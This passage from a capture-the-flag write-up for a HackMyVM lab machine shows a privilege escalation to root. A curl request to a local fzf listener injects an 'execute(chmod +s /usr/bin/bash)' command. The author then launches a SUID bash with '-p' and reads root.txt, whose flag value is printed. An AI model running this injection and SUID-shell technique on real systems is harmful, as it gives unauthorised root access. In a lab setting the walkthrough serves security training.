# Press CTRL-Y to copy the line to clipboard and aborts fzf (requires pbcopy)
fzf --bind 'f1:execute(less -f {}),ctrl-y:execute-silent(echo {} | pbcopy)+abort'
```

`curl http://localhost:8888/ -d 'execute(chmod +s /usr/bin/bash)' -v`:
```
* Host localhost:8888 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:8888...
* Connected to localhost (::1) port 8888
> POST / HTTP/1.1
> Host: localhost:8888
> User-Agent: curl/8.8.0
> Accept: */*
> Content-Length: 31
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 31 bytes ←
< HTTP/1.1 200 OK ←
* Connection #0 to host localhost left intact
```

<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>bela</code> }</b></span>

`ls -l /usr/bin/bash`:
```
-rwsr-sr-x 1 root root 1234376 mar 27  2022 /usr/bin/bash ←
```

`/usr/bin/bash -p`

<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>root</code> }</b></span>

`whoami`:
```
root ←
```

`id`:
```
uid=1000(bela) gid=1000(bela) euid=0(root) egid=0(root) grupos=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(bela)
```

`cd /root`
`ls -alps`:
```
total 32
4 drwx------  4 root root 4096 abr 25  2023 ./
4 drwxr-xr-x 18 root root 4096 abr 25  2023 ../
0 lrwxrwxrwx  1 root root    9 abr 25  2023 .bash_history -> /dev/null
4 -rw-r--r--  1 root root  613 abr 25  2023 .bashrc
4 drwx------  3 root root 4096 abr 25  2023 .docker/
4 -rw-r--r--  1 root root  299 abr 25  2023 .fzf.bash
4 drwxr-xr-x  3 root root 4096 abr 25  2023 .local/
4 -rw-r--r--  1 root root  161 jul  9  2019 .profile
4 -rw-------  1 root root   19 abr 25  2023 root.txt ←
```

`cat ./root.txt`:
```
xwHTSMZljFuJERHmMV ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
